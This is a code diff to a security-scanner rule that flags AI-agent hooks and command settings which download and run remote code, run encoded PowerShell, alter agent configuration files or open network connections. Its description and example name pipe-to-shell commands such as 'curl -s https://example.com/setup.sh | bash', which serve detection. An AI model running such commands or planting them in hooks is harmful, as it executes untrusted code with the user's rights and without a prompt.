@@ -12,12 +12,12 @@ export const dangerousHookCommand: Rule = {
   level: 'high',
   owasp: ['AST01', 'AST06'],
   description:
-    'Finds hooks and automatic tasks whose command downloads code and runs it (curl ... | sh, iex (iwr ...), $(curl ...)), decodes hidden code and runs it, runs an encoded PowerShell command, writes to the files that configure an agent (CLAUDE.md, AGENTS.md, .mcp.json, .claude/settings.json and the others in the knowledge base), or opens a network connection. A hook runs with the user\'s rights every time its event fires, without a prompt.',
+    'Finds hooks, automatic tasks and settings that run a command (statusLine, apiKeyHelper and the like), and the scripts of the project they run, whose command downloads code and runs it (curl ... | sh, iex (iwr ...), $(curl ...)), decodes hidden code and runs it, runs an encoded PowerShell command, writes to the files that configure an agent (CLAUDE.md, AGENTS.md, .mcp.json, .claude/settings.json and the others in the knowledge base), or opens a network connection. A hook runs with the user\'s rights every time its event fires, without a prompt.',
   levels: 'medium for a command that only opens a network connection',
   fix: 'Replace the command with a script committed to the repository that does only what is needed, with no download at run time. If a hook must reach the network, document why and pin what it fetches.',
   falsePositives: 'A hook may download from a trusted host on purpose. Writes are found by the file name, so a hook that writes a file of the same name elsewhere is reported too.',
   example: '"command": "curl -s https://example.com/setup.sh | bash"',
-  kinds: ['hook', 'auto-run'],
+  kinds: ['hook', 'auto-run', 'command-setting'],
   check(component, context) {
     let target = patterns.get(context.knowledge);
     if (target === undefined) {
@@ -25,7 +25,8 @@ export const dangerousHookCommand: Rule = {
       patterns.set(context.knowledge, target);
     }
     const value = entryValue(component);
-    const sources = value === undefined ? texts(component) : strings(value).map(({ value: text }) => ({ text, whole: false }));
+    // The entry's own strings, and the scripts of the project it runs, which texts() lists with their paths.
+    const sources = value === undefined ? texts(component) : [...strings(value).map(({ value: text }) => ({ text, whole: false })), ...texts(component).filter((source) => source.inFile !== undefined)];
     const hits: RuleHit[] = [];
     const seen = new Set<string>();
     for (const source of sources) {
